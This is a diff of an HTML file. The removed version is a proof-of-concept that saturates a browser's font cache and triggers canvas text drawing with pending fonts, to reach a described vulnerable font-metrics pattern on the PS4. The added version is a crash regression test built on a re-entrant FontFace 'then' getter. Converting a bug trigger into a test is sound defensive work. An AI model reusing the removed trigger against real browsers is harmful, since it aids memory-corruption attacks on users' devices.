@@ -1,51 +1,38 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8">
-    <title>PoC - Main Thread drawTextInternal Adaptation</title>
-</head>
-<body>
+<p>This test passes if it does not crash.</p>
 <script>
-// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
-const dummies = [];
-for (let i = 0; i < 3500; i++) {
-    const dummy = document.createElement('canvas').getContext('2d');
-    dummy.font = '10px "dummy' + i + '"';
-    dummies.push(dummy);
-}
+ 
+  let face = new FontFace('MyTestFam', 'local(Helvetica)');  
+  face.loaded.catch(() => {});
+  document.fonts.add(face);
 
-// 2. Fonte de >= 1MB data: URL para manter o estado pendente até o glyph walk
-const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+  let context = document.createElement('canvas').getContext('2d');
 
-const keepAlive = [];
-for (let attempt = 0; attempt < 2; attempt++) {
-    // metricsDonor cobre U+0020 (primária)
-    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
-    // measured cobre o intervalo Cherokee U+13A0-13FF
-    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
-    
-    document.fonts.add(metricsDonor);
-    document.fonts.add(measured);
+  context.save();
+  context.lineWidth = 0.5;
 
-    const canvas = document.createElement('canvas');
-    canvas.width = 64;
-    canvas.height = 64;
-    canvas.style.position = 'absolute';
-    canvas.style.left = '-9999px';
-    document.body.appendChild(canvas);
-    
-    const context = canvas.getContext('2d');
-    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-    keepAlive.push(metricsDonor, measured, context);
+  context.font = '10px MyTestFam';
 
-    // 3. ADAPTAÇÃO CHAVE: Em vez de measureText, chamamos fillText() 
-    // para acionar drawTextInternal() e atingir o padrão vulnerável de fontMetrics no PS4.
-    try {
-        context.fillText('\u13A0\u13A2\u13A4', 10, 10);
-    } catch (e) {
-        console.error(e);
+  let reentered = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get() {
+      if (reentered)
+        return undefined;      
+      reentered = true; 
+      for (let i = 0; i < 25; i++) {
+        context.save();
+        context.lineWidth = 1 + i;
+      }
+      reentered = false;     
+      return function(resolve) {
+        if (typeof resolve === 'function') resolve();
+      };
     }
-}
+  });
+
+  context.measureText('a');
+  
+  setTimeout(() => {
+  }, 200);
 </script>
-</body>
-</html>
